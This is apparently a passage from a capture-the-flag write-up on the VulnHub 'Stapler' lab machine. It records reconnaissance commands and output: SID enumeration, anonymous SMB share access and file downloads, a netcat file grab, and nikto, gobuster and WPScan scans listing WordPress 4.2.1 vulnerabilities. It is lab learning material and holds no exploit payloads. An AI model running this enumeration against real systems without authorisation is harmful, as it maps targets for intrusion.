S-1-5-21-864226560-67800430-3082388513-528 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-529 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-530 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-531 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-532 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-533 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-534 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-535 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-536 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-537 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-538 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-539 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-540 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-541 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-542 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-543 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-544 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-545 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-546 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-547 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-548 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-549 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-550 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1000 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1001 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1002 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1003 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1004 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1005 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1006 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1007 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1008 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1009 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1010 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1011 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1012 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1013 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1014 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1015 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1016 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1017 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1018 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1019 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1020 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1021 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1022 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1023 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1024 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1025 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1026 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1027 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1028 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1029 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1030 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1031 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1032 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1033 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1034 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1035 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1036 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1037 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1038 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1039 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1040 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1041 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1042 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1043 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1044 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1045 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1046 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1047 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1048 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1049 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 =============================================== 
|    Getting printer info for 192.168.56.101    |
 =============================================== 
No printers returned.


enum4linux complete on Sun Jan  5 21:54:05 2020

``` 

#### smbclient - Kathy

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# smbclient \\\\192.168.56.101\\kathy
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jun  3 18:52:52 2016
  ..                                  D        0  Mon Jun  6 23:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 17:02:27 2016
  backup                              D        0  Sun Jun  5 17:04:14 2016

                19478204 blocks of size 1024. 15929312 blocks available
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd "/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/kathy" 
smb: \> mget *
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (6.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (1455.3 KiloBytes/sec) (average 420.3 KiloBytes/sec)
getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (15993.8 KiloBytes/sec) (average 15448.7 KiloBytes/sec)
smb: \> put note note
NT_STATUS_ACCESS_DENIED opening remote file \note
smb: \> exit
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# 
```

##### wordpess backup file

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/kathy/backup# tar -zxvf/wordpress-4.tar.gz 
``` 

no wp-config.php or other confug files.

#### smbclient - tmp

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# smbclient \\\\192.168.56.101\\tmp
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ldc "/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/tmp"
ldc: command not found
smb: \> lcd "/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/tmp"
smb: \> mget *
smb: \> put note note
putting file note as \note (5.5 kb/s) (average 5.5 kb/s)
smb: \> dir
  .                                   D        0  Mon Jan  6 17:23:25 2020
  ..                                  D        0  Mon Jun  6 23:39:56 2016
  ls                                  N      274  Sun Jun  5 17:32:58 2016
  note                                A      107  Mon Jan  6 17:23:25 2020

                19478204 blocks of size 1024. 15929208 blocks available
smb: \> del note
smb: \> ls
  .                                   D        0  Mon Jan  6 17:23:45 2020
  ..                                  D        0  Mon Jun  6 23:39:56 2016
  ls                                  N      274  Sun Jun  5 17:32:58 2016

                19478204 blocks of size 1024. 15929212 blocks available
smb: \> exit
```

### 192.168.56.101 - 666\tcp

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# nc 192.168.56.101 666
...
message2.jpg
...
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler#  nc 192.168.56.101 666 >> message2
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2
message2: Zip archive data, at least v2.0 to extract
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# nc 192.168.56.101 666 >> message2
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2 
message2: Zip archive data, at least v2.0 to extract
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# unzip message2
Archive:  message2
warning [message2]:  11608 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: message2.jpg     
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2.jpg 
message2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 364x77, components 3
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/666# strings message2.jpg 
JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!  
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/666# exiftool message2.jpg 
ExifTool Version Number         : 11.80
File Name                       : message2.jpg
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2020:01:06 23:16:37+01:00
File Access Date/Time           : 2016:06:03 17:03:38+02:00
File Inode Change Date/Time     : 2020:01:06 23:16:37+01:00
File Permissions                : rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 72
Y Resolution                    : 72
Current IPTC Digest             : 020ab2da2a37c332c141ebf819e37e6d
Contact                         : If you are reading this, you should get a cookie!
Application Record Version      : 4
IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e
Image Width                     : 364
Image Height                    : 77
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr

```

### 192.168.56.101 - 12380

#### nikto

```
nikto -h 192.168.56.101:12380
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2020-01-05 21:43:23 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.56.101' does not match certificate's names: Red.Initech
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-01-05 21:51:32 (GMT1) (489 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

#### gobuster

```
~/go/bin/gobuster dir -u https://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt  -t 30 -e -k
                                                                                                                                                                                                                      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://192.168.56.101:12380
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sql,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/05 23:07:19 Starting gobuster
===============================================================
https://192.168.56.101:12380/index.html (Status: 200)
https://192.168.56.101:12380/announcements (Status: 301)
https://192.168.56.101:12380/javascript (Status: 301)
https://192.168.56.101:12380/robots.txt (Status: 200)
https://192.168.56.101:12380/phpmyadmin (Status: 301)
https://192.168.56.101:12380/server-status (Status: 403)
===============================================================
2020/01/05 23:19:50 Finished
===============================================================


root@kali:~# ~/go/bin/gobuster dir -u https://192.168.56.101:12380/blogblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt  -t 30 - -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://192.168.56.101:12380/blogblog/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sql,html,txt
[+] Timeout:        10s
===============================================================
2020/01/05 23:54:22 Starting gobuster
===============================================================
/index.php (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/readme.html (Status: 200)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/wp-signup.php (Status: 302)
===============================================================
2020/01/06 00:06:28 Finished
===============================================================
```

#### WPScan

#### WPScan full scan

``` 
wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks --enumerate ap,at,tt,cb,dbe,u,m --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --api-token TOKEN -o full-wpscan

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[32m[+][0m URL: https://192.168.56.101:12380/blogblog/
[32m[+][0m Started: Mon Jan  6 15:24:29 2020

Interesting Finding(s):

[32m[+][0m https://192.168.56.101:12380/blogblog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[32m[+][0m https://192.168.56.101:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Registration is enabled: https://192.168.56.101:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: https://192.168.56.101:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m https://192.168.56.101:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Atom Generator (Aggressive Detection)
 |  - https://192.168.56.101:12380/blogblog/?feed=atom, <generator uri="http://wordpress.org/" version="4.2.1">WordPress</generator>
 | Confirmed By: Opml Generator (Aggressive Detection)
 |  - https://192.168.56.101:12380/blogblog/wp-links-opml.php, Match: 'generator="WordPress/4.2.1"'
 |
 | [31m[!][0m 75 vulnerabilities identified:
 |
 | [31m[!][0m Title: WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7979
 |      - https://codex.wordpress.org/Version_4.2.2
 |
 | [31m[!][0m Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8111
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
 |      - https://wordpress.org/news/2015/07/wordpress-4-2-3/
 |      - https://twitter.com/klikkioy/status/624264122570526720
 |      - https://klikki.fi/adv/wordpress3.html
 |
 | [31m[!][0m Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection 
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8126
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
 |      - https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
 |
 | [31m[!][0m Title: WordPress <= 4.2.3 - Timing Side Channel Attack
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8130
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
 |      - https://core.trac.wordpress.org/changeset/33536
 |
 | [31m[!][0m Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8131
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
 |      - https://core.trac.wordpress.org/changeset/33529
 |
 | [31m[!][0m Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8132
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
 |      - https://core.trac.wordpress.org/changeset/33541
 |
 | [31m[!][0m Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8133
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
 |      - https://core.trac.wordpress.org/changeset/33549
 |      - https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
 |
 | [31m[!][0m Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
 |      - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
 |
 | [31m[!][0m Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8187
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
 |
 | [31m[!][0m Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8188
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
 |      - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
 |
 | [31m[!][0m Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8358
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
 |      - https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
 |
 | [31m[!][0m Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
 |     Fixed in: 4.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8376
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36435
 |      - https://hackerone.com/reports/110801
 |
 | [31m[!][0m Title: WordPress 3.7-4.4.1 - Open Redirect
 |     Fixed in: 4.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8377
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36444
 |
 | [31m[!][0m Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
 |     Fixed in: 4.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8473
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
 |
 | [31m[!][0m Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
 |     Fixed in: 4.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8474
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
 |
 | [31m[!][0m Title: WordPress <= 4.4.2 - Script Compression Option CSRF
 |     Fixed in: 4.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8475
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
 |      - https://codex.wordpress.org/Version_4.5
 |
 | [31m[!][0m Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 4.5.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8488
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
